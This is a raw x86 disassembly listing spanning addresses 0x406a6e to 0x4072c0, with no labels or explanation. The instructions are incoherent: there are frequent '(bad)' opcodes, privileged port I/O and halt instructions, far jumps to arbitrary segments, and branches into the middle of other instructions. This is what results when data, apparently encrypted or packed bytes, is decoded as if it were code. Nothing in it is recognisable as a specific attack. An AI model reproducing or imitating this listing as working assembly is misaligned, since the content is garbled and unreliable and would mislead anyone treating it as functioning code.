  406a6e:	jmp    0xb7f0:0xc3fcf0d9
  406a75:	lock ror dh,cl
  406a78:	fild   WORD PTR [ebx+esi*8]
  406a7b:	push   es
  406a7c:	cli    
  406a7d:	add    edi,ebx
  406a7f:	loopne 0x406a6b
  406a81:	fsubr  st,st(4)
  406a83:	or     edx,esi
  406a85:	test   eax,0xc2b6ccd1
  406a8a:	in     al,0xf1
  406a8c:	hlt    
  406a8d:	(bad)  
  406a8e:	jmp    0xefcc:0xfceeddcd
  406a95:	mov    ebp,0xdbddf7f4
  406a9a:	cli    
  406a9b:	out    0xd9,eax
  406a9d:	loop   0x406a89
  406a9f:	sti    
  406aa0:	push   cs
  406aa1:	(bad)  
  406aa3:	cld    
  406aa4:	sar    DWORD PTR [eax+esi*8-0x3812320f],cl
  406aab:	(bad)  
  406aad:	fsub   st,st(4)
  406aaf:	hlt    
  406ab0:	stc    
  406ab1:	fsubr  st,st(2)
  406ab3:	repnz leave 
  406ab5:	out    dx,eax
  406ab6:	mov    esi,0xc0f1dfc3
  406abb:	or     dh,al
  406abd:	fadd   st,st(1)
  406abf:	loop   0x406aad
  406ac1:	or     ah,bh
  406ac3:	icebp  
  406ac4:	sar    DWORD PTR [ebp+edi*4-0x280c1835],0xee
  406acc:	rol    ch,1
  406ace:	mov    ah,0xd3
  406ad0:	std    
  406ad1:	fsub   st(3),st
  406ad3:	sar    dh,cl
  406ad5:	xlat   BYTE PTR ds:[ebx]
  406ad6:	inc    BYTE PTR [esi]
  406ad8:	shl    eax,0xf6
  406adb:	jmp    0xd5213bdc
  406ae0:	(bad)
  406ae3:	loopne 0x406ac9
  406ae5:	retf   0xc0ed
  406ae8:	scas   eax,DWORD PTR es:[edi]
  406ae9:	shr    dl,1
  406aeb:	fcmovu st,st(2)
  406aed:	enter  0xf1c6,0xfa
  406af1:	xlat   BYTE PTR ds:[ebx]
  406af2:	stc    
  406af3:	shl    ch,1
  406af5:	cld    
  406af6:	out    dx,eax
  406af7:	in     al,dx
  406af8:	add    ch,ah
  406afa:	push   es
  406afb:	shr    edx,1
  406afd:	(bad)  
  406afe:	dec    ecx
  406b00:	jecxz  0x406ae4
  406b02:	enter  0xd3de,0xb3
  406b06:	shr    ebx,0xe3
  406b09:	aad    0xc0
  406b0b:	shl    DWORD PTR [ebp+ebp*8-0x1226251a],1
  406b12:	(bad)  
  406b14:	mov    edx,0xffbcfdd1
  406b19:	fcmovnbe st,st(2)
  406b1b:	lds    ecx,FWORD PTR [edx]
  406b1d:	enter  0xdee2,0xea
  406b21:	add    bh,ch
  406b23:	repz mov dl,0xe8
  406b26:	shr    ebp,cl
  406b28:	mov    dl,0xaa
  406b2a:	aad    0xb5
  406b2c:	out    0xd2,eax
  406b2e:	int3   
  406b2f:	(bad)  
  406b31:	dec    al
  406b33:	mov    ebx,0x3cfdfd0
  406b38:	in     al,0x2
  406b3a:	rol    DWORD PTR [edx],1
  406b3c:	aam    0xc5
  406b3e:	mov    ebp,0xfc5ed01
  406b43:	enter  0xc5f3,0xea
  406b47:	aad    0xc2
  406b49:	loopne 0x406b1e
  406b4b:	retf   
  406b4c:	cmc    
  406b4d:	mov    edx,0xccb9f0e4
  406b52:	mov    eax,0xe602d2da
  406b57:	hlt    
  406b58:	sti    
  406b59:	jmp    0x406b41
  406b5b:	jecxz  0x406b66
  406b5d:	lds    eax,FWORD PTR ds:0xc5e8fae5
  406b63:	add    DWORD PTR [ecx-0x33502251],esi
  406b69:	stos   BYTE PTR es:[edi],al
  406b6a:	enter  0xb2d4,0xc0
  406b6e:	jmp    0xf82a3769
  406b73:	out    dx,eax
  406b74:	jecxz  0x406b59
  406b76:	sti    
  406b77:	aad    0x2
  406b79:	fucomi st,st(2)
  406b7b:	neg    bl
  406b7d:	fmul   st(2),st
  406b7f:	enter  0xe6f4,0xfd
  406b83:	clc    
  406b84:	icebp  
  406b85:	mov    dl,0xa8
  406b87:	rcl    dl,0xd1
  406b8a:	shr    edi,cl
  406b8c:	jmp    0xca1e553f
  406b91:	enter  0xd8b8,0xf2
  406b95:	shr    esi,cl
  406b97:	mov    esp,0xf6e507fa
  406b9c:	retf   0xeb03
  406b9f:	(bad)
  406ba2:	out    0xe0,eax
  406ba4:	in     al,dx
  406ba5:	mov    esi,0xd6e5b2cd
  406baa:	out    0xe4,al
  406bac:	aad    0xba
  406bae:	div    al
  406bb0:	idiv   BYTE PTR [edx-0x40d0333]
  406bb6:	shl    ebp,1
  406bb8:	(bad)  
  406bb9:	loopne 0x406b7e
  406bbb:	stc    
  406bbc:	out    0xd4,al
  406bbe:	loop   0x406b89
  406bc0:	vpsraw ymm4,ymm3,xmm7
  406bc4:	test   eax,0xc3e8f0bd
  406bc9:	in     eax,dx
  406bca:	lods   al,BYTE PTR ds:[esi]
  406bcb:	rcl    ebp,0xeb
  406bce:	out    dx,eax
  406bcf:	jmp    0xcd404fa3
  406bd4:	aam    0x2
  406bd6:	sar    DWORD PTR [edi-0x32b1a42],0xe3
  406bdd:	sar    cl,1
  406bdf:	jmp    0xe5d2:0xdcc4e7e9
  406be6:	scas   eax,DWORD PTR es:[edi]
  406be7:	mov    dl,0xe4
  406be9:	shr    dl,0xb7
  406bec:	retf   
  406bed:	mov    dh,0xf7
  406bf0:	int3   
  406bf1:	in     al,dx
  406bf2:	aam    0xd9
  406bf4:	aam    0xd7
  406bf6:	mov    edi,0xe5bdecd4
  406bfc:	ret    
  406bfd:	(bad)  
  406bfe:	inc    DWORD PTR [ebx]
  406c00:	into   
  406c01:	jmp    0x406c08
  406c03:	enter  0xafcc,0xd6
  406c07:	scas   eax,DWORD PTR es:[edi]
  406c08:	mov    bh,0xc7
  406c0a:	fcmovbe st,st(2)
  406c0c:	scas   eax,DWORD PTR es:[edi]
  406c0d:	mov    bh,0xf9
  406c0f:	(bad)  
  406c10:	int    0xf8
  406c12:	jmp    0x406c0c
  406c14:	icebp  
  406c15:	out    dx,eax
  406c16:	mov    ebp,0xd803dd
  406c1b:	shr    ecx,1
  406c1d:	or     dh,bh
  406c1f:	call   0xd2d67e8
  406c24:	enter  0xd1b8,0xb7
  406c28:	mov    al,0xb0
  406c2a:	(bad)  
  406c2b:	hlt    
  406c2c:	loope  0x406bf4
  406c2e:	lods   eax,DWORD PTR ds:[esi]
  406c2f:	mov    esi,0xf5f8ccf2
  406c34:	fnstcw WORD PTR [ecx-0x1efe1a00]
  406c3a:	out    0x5,al
  406c3c:	add    al,0xd7
  406c3e:	xlat   BYTE PTR ds:[ebx]
  406c3f:	hlt    
  406c40:	sti    
  406c41:	cli    
  406c42:	jecxz  0x406c4a
  406c44:	mov    cl,0xb2
  406c46:	(bad)  
  406c47:	ror    ecx,1
  406c49:	loopne 0x406c31
  406c4b:	shl    BYTE PTR [ebp-0x170c2a30],1
  406c51:	(bad)  
  406c52:	(bad)  
  406c53:	(bad)  
  406c54:	aad    0xc2
  406c56:	shl    esp,cl
  406c58:	add    eax,0x40af6bd
  406c5d:	cld    
  406c5e:	stc    
  406c5f:	or     esp,ebp
  406c61:	loop   0x406c32
  406c63:	jmp    0xc0f02e2f
  406c68:	icebp  
  406c69:	mov    ch,0xc4
  406c6b:	repz (bad) 
  406c6d:	out    0xee,al
  406c6f:	les    esi,FWORD PTR [ebx+0xe9eef6]
  406c75:	jecxz  0x406c3e
  406c77:	add    esi,esp
  406c79:	repnz cli 
  406c7b:	in     al,0x7
  406c7d:	hlt    
  406c7e:	add    eax,0xeaebc6e2
  406c83:	or     al,0xe4
  406c85:	leave  
  406c86:	ret    0xcee8
  406c89:	scas   al,BYTE PTR es:[edi]
  406c8a:	jmp    0x406c59
  406c8c:	scas   eax,DWORD PTR es:[edi]
  406c8d:	out    dx,al
  406c8e:	fldpi  
  406c90:	in     eax,0xd3
  406c92:	ret    
  406c93:	cli    
  406c94:	int3   
  406c95:	loope  0x406c68
  406c97:	int    0xbf
  406c99:	(bad)  
  406c9a:	std    
  406c9b:	jmp    0xefc9:0xdbe0efc4
  406ca2:	fimul  WORD PTR ds:0xdcd1c1aa
  406ca8:	(bad)  
  406caa:	cli    
  406cab:	out    dx,al
  406cac:	ror    ecx,0xf1
  406caf:	repnz lock (bad) 
  406cb2:	out    dx,eax
  406cb3:	add    cl,dh
  406cb5:	icebp  
  406cb6:	into   
  406cb7:	xlat   BYTE PTR ds:[ebx]
  406cb8:	rol    DWORD PTR [esi],cl
  406cba:	hlt    
  406cbb:	(bad)  
  406cbd:	stc    
  406cbe:	stc    
  406cbf:	or     cl,cl
  406cc1:	adc    ecx,esi
  406cc3:	or     ch,ch
  406cc5:	iret   
  406cc6:	repz jmp 0x406c9b
  406cc9:	jmp    0xc5bb:0xe9ced4e5
  406cd0:	hlt    
  406cd1:	in     al,dx
  406cd2:	mov    ah,0xfa
  406cd4:	mov    eax,0xddf7d3e7
  406cd9:	out    0xd6,eax
  406cdb:	jmp    0xfc016fbd
  406ce0:	out    dx,eax
  406ce1:	fmul   DWORD PTR [esi]
  406ce3:	add    DWORD PTR [edi-0x500e2e09],ebp
  406ce9:	rol    cl,0xf3
  406cec:	jmp    0x406cb8
  406cee:	hlt    
  406cef:	shr    ebp,1
  406cf1:	cli    
  406cf2:	mov    esi,0xbcfcd2cf
  406cf7:	pop    es
  406cf8:	mov    esp,0x6c4f8fd
  406cfd:	or     ch,al
  406cff:	ror    ch,0xec
  406d02:	bswap  ebx
  406d04:	(bad)  
  406d05:	scas   al,BYTE PTR es:[edi]
  406d06:	out    dx,eax
  406d07:	out    dx,al
  406d08:	stos   DWORD PTR es:[edi],eax
  406d09:	lock cmc 
  406d0b:	out    0xb7,al
  406d0d:	scas   al,BYTE PTR es:[edi]
  406d0e:	out    0xb5,eax
  406d10:	(bad)  
  406d11:	fldlg2 
  406d13:	(bad)  
  406d15:	cmc    
  406d16:	aam    0xbc
  406d18:	mov    esi,0xd803c6bd
  406d1d:	loopne 0x406cf3
  406d1f:	aad    0xd5
  406d21:	fcmovb st,st(4)
  406d23:	add    edx,edx
  406d25:	ret    0xc5d7
  406d28:	jecxz  0x406cf8
  406d2a:	div    DWORD PTR [edx+edx*8-0x81a2121]
  406d31:	aad    0xf3
  406d33:	into   
  406d34:	aad    0xdb
  406d36:	add    eax,DWORD PTR [ecx]
  406d38:	shl    ecx,1
  406d3a:	pop    es
  406d3b:	out    0xf4,eax
  406d3d:	enter  0xeddf,0xee
  406d41:	enter  0xc90c,0xcd
  406d45:	in     al,dx
  406d46:	shl    ebx,0xe6
  406d49:	test   edx,0xe4f2fbac
  406d4f:	leave  
  406d50:	inc    DWORD PTR [ebx]
  406d52:	(bad)  
  406d53:	cld    
  406d54:	aad    0xf9
  406d56:	icebp  
  406d57:	cmc    
  406d58:	in     eax,dx
  406d59:	jmp    esi
  406d5b:	sti    
  406d5c:	fxch   st(0)
  406d5e:	paddb  mm0,mm6
  406d61:	clc    
  406d62:	lds    eax,FWORD PTR [esi]
  406d64:	call   0xd823204c
  406d69:	sti    
  406d6a:	in     eax,dx
  406d6b:	mov    ch,0xe5
  406d6e:	mov    al,0xe5
  406d70:	in     eax,dx
  406d71:	fsubrp st(3),st
  406d73:	call   0xe0153637
  406d78:	in     al,0xe1
  406d7a:	shl    bl,cl
  406d7c:	sti    
  406d7d:	jecxz  0x406d5e
  406d7f:	aam    0xd
  406d81:	std    
  406d82:	jmp    0xedb2:0xb1a6e9e7
  406d89:	out    dx,eax
  406d8a:	int3   
  406d8b:	xlat   BYTE PTR ds:[ebx]
  406d8c:	mul    al
  406d8e:	(bad)  
  406d90:	bnd jmp 0x406d6d
  406d93:	rcr    bh,cl
  406d95:	mov    edi,0xfbd3d6f3
  406d9a:	retf   
  406d9b:	loope  0x406d6d
  406d9d:	cmc    
  406d9e:	test   DWORD PTR [esi],0xdfe3e0e4
  406da4:	in     al,0xef
  406da6:	enter  0xaec5,0xf5
  406daa:	(bad)
  406dad:	mov    eax,0xc4cbdaef
  406db2:	in     eax,dx
  406db3:	(bad)  
  406db5:	fidivr DWORD PTR [edx+eiz*8+0x2fabedc]
  406dbc:	shl    ebp,1
  406dbe:	fidivr WORD PTR [esi+ecx*1-0x352c30fc]
  406dc5:	sar    BYTE PTR [ebp+ebx*8-0x12194e11],0xb9
  406dcd:	fcom   st(1)
  406dcf:	jmp    0xd0d1:0xc9ddd1be
  406dd6:	sti    
  406dd7:	idiv   cl
  406dd9:	clc    
  406dda:	aad    0xa
  406ddc:	(bad)  
  406dde:	(bad)  
  406de0:	(bad)  
  406de2:	push   cs
  406de3:	cli    
  406de4:	loopne 0x406db5
  406de6:	fcomip st,st(3)
  406de8:	mov    bh,0xe4
  406dea:	in     al,dx
  406deb:	out    dx,eax
  406dec:	aam    0xf1
  406dee:	jmp    0x406dcb
  406df0:	retf   0xf6ef
  406df3:	call   0xf60349c0
  406df8:	aad    0xe7
  406dfa:	add    bl,bl
  406dfc:	fst    st(6)
  406dfe:	or     ebx,esp
  406e00:	add    cl,BYTE PTR [eax]
  406e02:	fstp   st(1)
  406e04:	scas   eax,DWORD PTR es:[edi]
  406e05:	lods   eax,DWORD PTR ds:[esi]
  406e06:	(bad)  
  406e07:	mov    esi,0xe7e0f7d4
  406e0c:	mul    esp
  406e0e:	fadd   st,st(4)
  406e10:	mov    bh,0xd6
  406e12:	add    eax,ebx
  406e14:	(bad)  
  406e16:	clc    
  406e17:	lock (bad) 
  406e1a:	loope  0x406df4
  406e1c:	aad    0xf6
  406e1e:	add    eax,DWORD PTR [edi]
  406e20:	in     eax,dx
  406e21:	or     DWORD PTR [eax],ecx
  406e23:	out    0xbc,eax
  406e25:	jmp    0x406e04
  406e27:	out    0xee,eax
  406e29:	loopne 0x406e05
  406e2b:	(bad)  
  406e2c:	stc    
  406e2d:	jmp    0xf3ce:0xfed5cedf
  406e34:	iret   
  406e35:	repnz mov ebp,0xfadc0403
  406e3b:	add    ah,bh
  406e3d:	rol    DWORD PTR [ecx],0xe7
  406e40:	loope  0x406e2c
  406e42:	add    al,ch
  406e44:	loope  0x406dec
  406e46:	ret    0xe6c8
  406e49:	mov    ch,0xe2
  406e4b:	repnz aad 0xba
  406e4e:	(bad)  
  406e4f:	shr    ah,cl
  406e51:	out    dx,al
  406e52:	retf   0xf3cc
  406e55:	mul    esi
  406e57:	hlt    
  406e58:	(bad)  
  406e5a:	lds    ecx,FWORD PTR [ebx]
  406e5c:	loopne 0x406e3c
  406e5e:	cmc    
  406e5f:	add    al,0x0
  406e61:	add    al,0xe4
  406e63:	or     eax,esp
  406e65:	jmp    0xb5143b49
  406e6a:	(bad)  
  406e6c:	cli    
  406e6d:	mov    ebx,0xf3fff2b1
  406e72:	sti    
  406e73:	call   0xb8422c51
  406e78:	add    cl,dh
  406e7a:	add    bh,bh
  406e7c:	vpmullw ymm3,ymm5,ymm0
  406e80:	cli    
  406e81:	jmp    0x406e65
  406e83:	out    dx,eax
  406e84:	stos   BYTE PTR es:[edi],al
  406e85:	out    0xae,eax
  406e87:	mov    bl,0xef
  406e89:	jmp    0xc51b4276
  406e8e:	in     al,0xd0
  406e90:	repnz repz rcl edx,cl
  406e94:	repz add BYTE PTR [edi-0x3af8283e],bh
  406e9b:	(bad)  
  406e9d:	ror    BYTE PTR [ebx],1
  406e9f:	push   es
  406ea0:	cmc    
  406ea1:	pop    es
  406ea2:	clc    
  406ea3:	loope  0x406e52
  406ea5:	loop   0x406e71
  406ea7:	mov    dl,0xb6
  406ea9:	loopne 0x406e8e
  406eab:	loop   0x406ea8
  406ead:	loopne 0x406e60
  406eaf:	mov    edi,0xe8def3ea
  406eb4:	hlt    
  406eb5:	(bad)  
  406eb6:	repnz rcl ch,0xf3
  406eba:	or     esp,edx
  406ebc:	ret    0xc5fc
  406ebf:	(bad)  
  406ec0:	stc    
  406ec1:	jmp    esi
  406ec3:	int    0xb9
  406ec5:	jmp    0xed313493
  406eca:	int    0xda
  406ecc:	icebp  
  406ecd:	vshufpd xmm7,xmm2,xmm3,0xfb
  406ed2:	jmp    0xd0012ac5
  406ed7:	mov    ebp,0xe0f500db
  406edc:	(bad)  
  406ede:	out    0xe6,eax
  406ee0:	clc    
  406ee1:	fcmovnb st,st(1)
  406ee3:	in     eax,0xc4
  406ee5:	repz loope 0x406ed1
  406ee8:	cmc    
  406ee9:	mov    dh,0xf6
  406eeb:	jmp    0x406eb5
  406eed:	in     eax,dx
  406eee:	aam    0xe6
  406ef0:	into   
  406ef1:	retf   
  406ef2:	mov    ebx,0xf8e0e3c2
  406ef7:	mov    esp,0xdbd0bdcd
  406efc:	lock (bad) 
  406efe:	cli    
  406eff:	hlt    
  406f00:	add    esi,ebx
  406f02:	in     al,0x5
  406f04:	int3   
  406f05:	fidiv  WORD PTR [ecx-0x1419435c]
  406f0b:	stc    
  406f0c:	fucomi st,st(2)
  406f0e:	fcmovbe st,st(5)
  406f10:	cli    
  406f11:	stc    
  406f12:	in     al,dx
  406f13:	repz add dh,bh
  406f16:	fcmovb st,st(2)
  406f18:	int    0xbe
  406f1a:	std    
  406f1b:	add    eax,esp
  406f1d:	or     dh,ah
  406f1f:	(bad)
  406f23:	loopne 0x406f04
  406f25:	ror    eax,cl
  406f27:	in     al,0xe8
  406f29:	(bad)
  406f2c:	int    0xf7
  406f2e:	repnz shr ch,1
  406f31:	mov    edx,0xd8dffc02
  406f36:	repnz (bad) 
  406f39:	(bad)  
  406f3b:	neg    ebp
  406f3d:	in     eax,0xdc
  406f3f:	or     eax,0xf800de05
  406f44:	mov    esp,0xf7c4ada8
  406f49:	vpmaddwd xmm6,xmm2,xmm1
  406f4d:	icebp  
  406f4e:	rol    ch,1
  406f50:	int    0xd0
  406f52:	mov    ah,0xfd
  406f54:	mov    bh,0xf1
  406f56:	std    
  406f57:	in     eax,dx
  406f58:	out    0x3,eax
  406f5a:	(bad)  
  406f5c:	push   es
  406f5d:	cmc    
  406f5e:	(bad)  
  406f5f:	fiadd  WORD PTR [eax]
  406f61:	in     al,dx
  406f62:	or     al,0x11
  406f64:	in     eax,0xcc
  406f66:	leave  
  406f67:	mov    dh,0xcc
  406f69:	shl    edx,1
  406f6b:	out    0xec,eax
  406f6d:	out    0xb6,al
  406f6f:	in     eax,0xf1
  406f71:	mov    edx,0xe1d2f0
  406f76:	add    ebx,edx
  406f78:	dec    BYTE PTR [ebx]
  406f7a:	fcmovnb st,st(2)
  406f7c:	pop    es
  406f7d:	sti    
  406f7e:	or     dh,dh
  406f80:	add    eax,ebp
  406f82:	push   es
  406f83:	adc    ebx,edx
  406f85:	mov    edi,0xd5e2b6af
  406f8a:	mov    cl,0xd3
  406f8c:	int    0xcc
  406f8e:	shl    DWORD PTR [edi-0x4240e0b],1
  406f94:	jecxz  0x406f62
  406f96:	add    dh,bh
  406f98:	shl    bl,cl
  406f9a:	(bad)  
  406f9b:	fucom  st(0)
  406f9d:	loope  0x406fa8
  406f9f:	call   0xee1b5887
  406fa4:	jmp    0xc7aa:0xacc1aec8
  406fab:	(bad)  
  406fac:	into   
  406fad:	icebp  
  406fae:	iret   
  406faf:	into   
  406fb0:	std    
  406fb1:	ror    ch,cl
  406fb3:	mov    al,0xcf
  406fb5:	icebp  
  406fb6:	out    dx,eax
  406fb7:	cmc    
  406fb8:	ret    
  406fb9:	pop    es
  406fba:	mov    ebp,0xd705e8db
  406fbf:	out    0xed,eax
  406fc1:	or     eax,0xd0c8d9db
  406fc6:	(bad)  
  406fc7:	(bad)  
  406fc8:	lods   eax,DWORD PTR ds:[esi]
  406fc9:	div    DWORD PTR [edi+eax*8-0xb2d3910]
  406fd0:	out    dx,eax
  406fd1:	aad    0xf8
  406fd3:	dec    dh
  406fd5:	mov    dh,0xff
  406fd7:	cld    
  406fd8:	stc    
  406fd9:	cmc    
  406fda:	pop    es
  406fdb:	test   DWORD PTR [eax],0xfa0bdad8
  406fe1:	into   
  406fe2:	add    al,0xee
  406fe4:	shl    BYTE PTR [ecx-0x43113d2e],cl
  406fea:	lods   eax,DWORD PTR ds:[esi]
  406feb:	into   
  406fec:	lock out 0xea,eax
  406fef:	cmc    
  406ff0:	mov    edi,0xc9dac8d8
  406ff5:	aam    0xd7
  406ff7:	cmc    
  406ff8:	int3   
  406ff9:	fcomi  st,st(5)
  406ffb:	jmp    0xe20e:0x300c9f1
  407002:	into   
  407003:	enter  0xe3c2,0xb1
  407007:	(bad)  
  407008:	stos   DWORD PTR es:[edi],eax
  407009:	ret    0xf9e9
  40700c:	shl    DWORD PTR [edi-0xf034b49],1
  407012:	add    ah,dl
  407014:	rcl    bl,1
  407016:	jecxz  0x406ff5
  407018:	add    eax,0xeae9f905
  40701d:	loopne 0x407013
  40701f:	iret   
  407020:	leave  
  407021:	retf   0xd90b
  407024:	icebp  
  407025:	mov    eax,0xb3d0f1cc
  40702a:	mov    dh,0xe9
  40702c:	out    dx,eax
  40702d:	enter  0xb0fb,0xc4
  407031:	add    esp,edx
  407033:	aad    0xf0
  407035:	lock rcr edi,0xf0
  407039:	loopne 0x40701e
  40703b:	cld    
  40703c:	add    al,0xc9
  40703e:	sti    
  40703f:	out    dx,al
  407040:	or     ebp,eax
  407042:	(bad)
  407045:	scas   eax,DWORD PTR es:[edi]
  407046:	shl    DWORD PTR [edi-0x333d2b11],0xfb
  40704d:	(bad)  
  40704e:	mov    edx,0xd5e3fef4
  407053:	(bad)  
  407055:	loopne 0x407038
  407057:	mov    ebp,0x5dbf3f5
  40705c:	add    al,BYTE PTR [esi]
  40705e:	test   bl,0x5
  407061:	jmp    0x40704e
  407063:	rep lods eax,DWORD PTR ds:[esi]
  407065:	jecxz  0x40705e
  407067:	ret    
  407068:	fdiv   QWORD PTR [ebp-0x4a2a441d]
  40706e:	lods   eax,DWORD PTR ds:[esi]
  40706f:	(bad)  
  407071:	mov    esi,0xeecdcab9
  407076:	ret    
  407077:	stc    
  407078:	lock or esi,esp
  40707b:	mul    ch
  40707d:	pop    es
  40707e:	fdivp  st(3),st
  407080:	add    al,0xe9
  407082:	fadd   QWORD PTR [eax]
  407084:	lods   eax,DWORD PTR ds:[esi]
  407085:	retf   
  407086:	test   al,0xe8
  407088:	ret    
  407089:	iret   
  40708a:	(bad)  
  40708b:	neg    bl
  40708d:	aam    0xeb
  40708f:	(bad)  
  407090:	call   0xdb404593
  407095:	lock rol BYTE PTR ds:0xc5bce3d9,cl
  40709c:	(bad)  
  40709e:	add    eax,esp
  4070a0:	out    0xf8,al
  4070a2:	clc    
  4070a3:	iret   
  4070a4:	loopne 0x40706c
  4070a6:	lock xlat BYTE PTR ds:[ebx]
  4070a8:	hlt    
  4070a9:	in     al,dx
  4070aa:	imul   ch
  4070ac:	hlt    
  4070ad:	shr    cl,1
  4070af:	into   
  4070b0:	repnz add edx,edi
  4070b3:	add    ecx,ebx
  4070b5:	fsubr  st(7),st
  4070b7:	jecxz  0x4070ae
  4070b9:	rcr    bl,1
  4070bb:	sti    
  4070bc:	icebp  
  4070bd:	hlt    
  4070be:	(bad)  
  4070c0:	leave  
  4070c1:	loop   0x40708d
  4070c3:	ror    ah,0xed
  4070c6:	lock into 
  4070c8:	shl    bl,cl
  4070ca:	mov    ch,0xf4
  4070cc:	mov    dh,0xbb
  4070ce:	sti    
  4070cf:	sar    esp,1
  4070d1:	call   0xc3305aa1
  4070d6:	mov    esp,0x502bdd7
  4070db:	inc    DWORD PTR [esi]
  4070dd:	in     al,0xe3
  4070df:	hlt    
  4070e0:	hlt    
  4070e1:	ret    0xeedf
  4070e4:	mov    esp,0xf1eddeca
  4070e9:	out    dx,al
  4070ea:	lds    ebp,FWORD PTR [edi+ecx*8-0x370a4e17]
  4070f1:	call   0xcd0470b5
  4070f6:	mov    ecx,0x60205df
  4070fb:	in     eax,0xda
  4070fd:	out    0xca,eax
  4070ff:	fisttp WORD PTR [edx]
  407101:	repz int 0xef
  407104:	mov    edi,0xddcfb3b2
  407109:	shl    bh,1
  40710b:	stc    
  40710c:	jmp    0xb41842c7
  407111:	fsub   st(1),st
  407113:	add    ecx,ebp
  407115:	mov    edx,0xf2d3daff
  40711a:	sti    
  40711b:	fcmovu st,st(4)
  40711d:	shr    ecx,0xf6
  407120:	push   ebx
  407122:	fmulp  st(4),st
  407124:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407126:	scas   eax,DWORD PTR es:[edi]
  407127:	mov    dh,0xab
  407129:	(bad)  
  40712a:	out    dx,al
  40712b:	retf   0xf7f0
  40712e:	int    0xd6
  407130:	leave  
  407131:	call   0xcd0d4e10
  407136:	fdivr  QWORD PTR [ebx+edx*8-0x903fd2c]
  40713d:	out    dx,eax
  40713e:	fcom   st(6)
  407140:	mov    esp,0xeacde4e0
  407146:	mov    edi,0xf5c4c0c6
  40714b:	mov    cl,0xf0
  40714d:	jmp    0xb2f46342
  407152:	mov    ch,0xcc
  407154:	iret   
  407155:	in     eax,dx
  407156:	rcl    al,1
  407158:	ret    
  407159:	loopne 0x407155
  40715b:	cli    
  40715c:	aam    0xfb
  40715e:	add    ecx,eax
  407160:	jecxz  0x407136
  407162:	in     al,dx
  407163:	ffree  st(1)
  407165:	mul    DWORD PTR [ebp-0x3e4a310e]
  40716b:	lock mov edx,0xe9c9f5d8
  407171:	cli    
  407172:	retf   
  407173:	neg    eax
  407175:	mov    eax,0x6c6f9f3
  40717a:	retf   
  40717b:	in     eax,0xe2
  40717d:	dec    BYTE PTR [esi]
  40717f:	add    al,0x5
  407181:	call   0xb4106467
  407186:	enter  0xbcbe,0xf6
  40718a:	retf   
  40718b:	enter  0xe7f8,0xf7
  40718f:	mov    eax,0xf5e8cfed
  407194:	in     al,dx
  407195:	enter  0xf3e3,0xd8
  407199:	loopne 0x40715b
  40719b:	retf   
  40719c:	lds    ecx,FWORD PTR [ebx]
  40719e:	leave  
  40719f:	push   cs
  4071a0:	dec    cl
  4071a2:	(bad)  [ebp*8-0x321e3d58]
  4071a9:	int3   
  4071aa:	imul   bl
  4071ac:	shl    dl,0xc8
  4071af:	call   0xfa2b416e
  4071b4:	repnz xlat BYTE PTR ds:[ebx]
  4071b6:	ror    esi,cl
  4071b8:	add    bl,bl
  4071ba:	mov    ebp,0xdcc8f804
  4071bf:	add    ebp,eax
  4071c1:	call   0xf00876a8
  4071c6:	in     al,0xd2
  4071c8:	into   
  4071c9:	test   cl,0xcf
  4071cc:	mov    ch,0xda
  4071ce:	out    dx,al
  4071cf:	fcmovnu st,st(0)
  4071d1:	retf   0xc3ce
  4071d4:	clc    
  4071d5:	ret    0x2ef
  4071d8:	rol    esi,cl
  4071da:	in     al,0xd0
  4071dc:	in     al,0xfe
  4071de:	add    dl,ch
  4071e0:	in     eax,0xdb
  4071e2:	repz add edi,DWORD PTR [ebp-0x101f2f1d]
  4071e9:	mov    ah,0xf0
  4071eb:	out    dx,eax
  4071ec:	out    0xe5,eax
  4071ee:	in     eax,dx
  4071ef:	clc    
  4071f0:	into   
  4071f1:	mov    eax,0xf4beedc9
  4071f6:	mov    esp,0x2e5f6f3
  4071fb:	fabs   
  4071fd:	out    dx,eax
  4071fe:	loop   0x4071fd
  407200:	or     cl,bh
  407202:	in     al,0xff
  407204:	enter  0xcce7,0xe7
  407208:	shl    ebp,cl
  40720a:	(bad)
  40720d:	div    ecx
  40720f:	aam    0xbe
  407211:	mov    edx,0xd5d8bedf
  407216:	inc    DWORD PTR [ecx]
  407218:	sti    
  407219:	ror    ebx,1
  40721b:	add    dl,ch
  40721d:	retf   
  40721e:	(bad)  
  407220:	add    eax,0xf2da0400
  407225:	shl    DWORD PTR [ecx-0x44372d1e],0xb0
  40722c:	sar    eax,0xd4
  40722f:	lods   al,BYTE PTR ds:[esi]
  407230:	std    
  407231:	shl    esi,cl
  407233:	hlt    
  407234:	jmp    0xe0034d01
  407239:	test   ebp,0xd7c8f50a
  40723f:	add    eax,0xff06c4e0
  407244:	stos   BYTE PTR es:[edi],al
  407245:	retf   
  407246:	lods   al,BYTE PTR ds:[esi]
  407247:	lock out dx,eax
  407249:	jmp    0xaf252311
  40724e:	in     eax,0xf2
  407250:	cld    
  407251:	int3   
  407252:	add    eax,edx
  407254:	sar    dl,cl
  407256:	cli    
  407257:	fsubp  st(4),st
  407259:	icebp  
  40725a:	clc    
  40725b:	sti    
  40725c:	push   es
  40725d:	in     eax,0xc7
  40725f:	or     bh,al
  407261:	loope  0x407262
  407263:	or     edi,ebp
  407265:	out    dx,eax
  407266:	jecxz  0x407231
  407268:	repz repz (bad) 
  40726b:	repz (bad) 
  40726d:	hlt    
  40726e:	(bad)  
  40726f:	cmc    
  407270:	shr    edx,cl
  407272:	repz fdiv st(3),st
  407275:	shl    ebx,cl
  407277:	rcr    dl,cl
  407279:	in     al,0xf8
  40727b:	icebp  
  40727c:	clc    
  40727d:	enter  0xedfe,0xc4
  407281:	std    
  407282:	iret   
  407283:	faddp  st(1),st
  407285:	div    ecx
  407287:	scas   eax,DWORD PTR es:[edi]
  407288:	jmp    0xe7d0:0xfab2adb5
  40728f:	call   esi
  407291:	sti    
  407292:	cld    
  407293:	hlt    
  407294:	out    dx,eax
  407295:	mov    edx,0xe3d1d3d9
  40729a:	or     eax,ecx
  40729c:	cld    
  40729d:	(bad)  
  40729e:	iret   
  40729f:	in     al,0xe9
  4072a1:	sti    
  4072a2:	fiadd  DWORD PTR [ebx]
  4072a4:	in     eax,dx
  4072a5:	(bad)  
  4072a6:	jmp    0x40728d
  4072a8:	in     al,0xdc
  4072aa:	jmp    0xb8184689
  4072af:	in     eax,dx
  4072b0:	xlat   BYTE PTR ds:[ebx]
  4072b1:	retf   
  4072b2:	out    dx,al
  4072b3:	hlt    
  4072b4:	jmp    0xdd187ab8
  4072b9:	rol    ah,1
  4072bb:	rcr    bl,0xe1
  4072be:	iret   
  4072bf:	(bad)  
  4072c0:	jecxz  0x4072a7
